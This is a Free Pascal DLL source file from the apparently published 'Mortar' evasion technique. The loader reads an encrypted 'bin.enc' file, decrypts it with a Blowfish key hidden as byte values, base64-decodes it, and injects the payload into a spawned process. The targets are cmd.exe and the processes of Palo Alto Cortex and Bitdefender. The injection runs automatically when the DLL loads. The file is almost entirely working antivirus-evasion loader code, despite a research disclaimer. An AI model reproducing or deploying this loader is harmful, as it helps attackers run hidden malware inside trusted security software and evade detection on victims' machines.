library agressor;

 {
 ===========================================
 MIT License

Copyright (c) 2021 0xsp security research and development

  Title : customized Dll libary for Mortar technique
  Author : 0xsp.com @zux0x3a


  the author of this module is not responsible for any misuse of this code or similair copied code, the source code and compiled binaries
  are published for the security researching only.
  the technique has been presented in online conference before the release and well-detailed paper has been posted online to help open-source community to build
  enhanced security solutions.

 ===============================================================

  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.




 }

{$mode objfpc}{$H+}

uses
  Classes,windows,blowfish,runner,SysUtils,base64,process, strutils;



function Base64ToStream(const ABase64:string; AOutStream: TMemoryStream; const AStrict: Boolean=false):Boolean;
var
  InStream: TStringStream;
  Decoder: TBase64DecodingStream;
  temp :string;
    BA_IN, BA_OUT: array of Byte;
begin
  setlength(BA_IN,20);


  // adding these as optional in case you wanna do some random nops into the memory

  BA_IN[0]:= $90;
  BA_IN[1]:= $90;
  BA_IN[2]:= $90;
  BA_IN[3]:= $90;
  BA_IN[4]:= $90;
  BA_IN[5]:= $90;
  BA_IN[6]:= $90;
  BA_IN[7]:= $90;
  BA_IN[8]:= $90;
  BA_IN[9]:= $90;
  BA_IN[10]:= $90;
  BA_IN[11]:= $90;
  BA_IN[12]:= $90;
  BA_IN[13]:= $90;
  BA_IN[14]:= $90;
  BA_IN[15]:= $90;
  BA_IN[16]:= $90;
  BA_IN[17]:= $90;
  BA_IN[18]:= $90;
  BA_IN[19]:= $90;

  Result := False;
  InStream := TStringStream.Create(ABase64);

  try
    if AStrict then
      Decoder := TBase64DecodingStream.Create(InStream, bdmStrict)
    else
      Decoder := TBase64DecodingStream.Create(InStream, bdmMIME);
    try
      AOutStream.Seek(0,sofrombeginning);
    //   AoutStream.WriteBuffer(BA_IN,20);
     //  AoutStream.Position:=0;
       AOutStream.CopyFrom(decoder,decoder.Size);
       Result := True;
    finally
      Decoder.Free;
    end;
  finally
    InStream.Free;
  end;
end;

function bintostr(const bin: array of byte): string;
const HexSymbols = '0123456789ABCDEF';
var i: integer;
begin
  SetLength(Result, 2*Length(bin));
  for i :=  0 to Length(bin)-1 do begin
    Result[1 + 2*i + 0] := HexSymbols[1 + bin[i] shr 4];
    Result[1 + 2*i + 1] := HexSymbols[1 + bin[i] and $0F];
  end;
end;

function blowfish_decryption(input:string):string;
var
  de :TBlowFishDeCryptStream;
  str_strm: TStringStream;
  key:rawbytestring;
  AMemStr, AMemStr2: TMemoryStream;
  AStrStr: TStringStream;
  processhandle:thandle;
  BA_IN: array of Byte;
  outp,url,temp:string;


begin

//7a 75 78 69 61 6d 68 65 72 65
   SetLength(BA_IN, 10);     //string convert into bytes in order avoid storing key as string
   BA_IN[0]:= $7a;
   BA_IN[1]:= $75;
   BA_IN[2]:= $78;
   BA_IN[3]:= $69;
   BA_IN[4]:= $61;
   BA_IN[5]:= $6d;
   BA_IN[6]:= $68;
   BA_IN[7]:= $65;
   BA_IN[8]:= $72;
   BA_IN[9]:= $65;


  url := getcurrentdir+'\bin.enc';   // place the encrypted binary in same folder

  AMemStr := TMemoryStream.Create;
 AMemStr.LoadFromFile(url);
  AmemStr.Write(outp[1],length(outp) * sizeof(outp[1]));
 AMemStr.Position := 0;

  //copy MemoryStream to StringStream
  AStrStr := TStringStream.Create('');
  AStrStr.Size := AMemStr.Size;
  AStrStr.CopyFrom(AMemStr, AMemStr.Size);
  AStrStr.Position := 0;

   key := TEncoding.UTF8.GetString(BA_IN); // getting string value of array of bytes.


  str_strm := TStringStream.Create(AStrStr.DataString);
  de := TBlowFishDeCryptStream.Create(key,str_strm);
  AStrStr.Free;
  SetLength(temp,str_strm.Size);
  de.Read(temp[1],str_strm.Size);
  AMemStr2 := TMemoryStream.Create;
  Base64tostream(temp,Amemstr2,false);

   Fork_x64(input,runner.TByteArray(AMemStr2.memory),processhandle);
   AMemStr2.Free;
  Amemstr.Free;

  end;

procedure dec; stdcall;

begin

 // normal mode, cmd process
blowfish_decryption('c:\windows\system32\cmd.exe');

end;

procedure stealth; stdcall;
begin

 blowfish_decryption('C:\Program Files\Palo Alto Networks\Traps\CyveraConsole.exe');
end;

procedure bit; stdcall; 
begin
blowfish_decryption('C:\Program Files\Bitdefender\Bitdefender Security\bdservicehost.exe');
end; 


exports dec,
        bit,
        stealth;
begin
 // here replace the path to any XDR solution or AV,below is default path of Cortex
  blowfish_decryption('C:\Program Files\Palo Alto Networks\Traps\CyveraConsole.exe');
end.

